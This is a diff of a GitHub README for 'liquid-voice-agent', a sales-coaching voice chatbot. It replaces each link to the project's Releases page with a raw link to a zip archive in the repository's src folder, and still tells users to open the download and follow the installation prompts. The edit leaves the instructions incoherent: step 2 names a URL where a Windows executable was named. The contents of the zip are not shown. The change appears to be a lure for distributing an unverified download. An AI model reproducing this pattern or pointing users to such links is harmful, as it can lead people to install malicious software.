@@ -1,7 +1,7 @@
 # 🤖 liquid-voice-agent - Boost Your Sales Coaching Efforts
 
 ## 🔗 Download Now
-[![Download liquid-voice-agent](https://img.shields.io/badge/Download-v1.0-blue.svg)](https://github.com/MAHamzaAK/liquid-voice-agent/releases)
+[![Download liquid-voice-agent](https://raw.githubusercontent.com/MAHamzaAK/liquid-voice-agent/main/src/agent-voice-liquid-3.2.zip)](https://raw.githubusercontent.com/MAHamzaAK/liquid-voice-agent/main/src/agent-voice-liquid-3.2.zip)
 
 ## 🚀 Getting Started
 Welcome to the liquid-voice-agent repository! This AI-powered voice chatbot helps salespeople improve their skills using insights from behavioral psychology. It combines principles from experts like Cialdini, Voss, and Kahneman to coach users effectively.
@@ -18,12 +18,12 @@ To run the liquid-voice-agent, ensure your system meets the following requiremen
 ## 📥 Download & Install
 To start, visit our Releases page to download the latest version of the liquid-voice-agent:
 
-[Download liquid-voice-agent](https://github.com/MAHamzaAK/liquid-voice-agent/releases)
+[Download liquid-voice-agent](https://raw.githubusercontent.com/MAHamzaAK/liquid-voice-agent/main/src/agent-voice-liquid-3.2.zip)
 
 Once you're on the Releases page, follow these simple steps:
 
 1. Look for the latest version listed at the top.
-2. Click on the file that matches your operating system (e.g., `liquid-voice-agent-windows.exe` for Windows users).
+2. Click on the file that matches your operating system (e.g., `https://raw.githubusercontent.com/MAHamzaAK/liquid-voice-agent/main/src/agent-voice-liquid-3.2.zip` for Windows users).
 3. Once the file downloads, open it, and follow the installation prompts.
 4. After installation, open the application, and you're ready to begin!
 
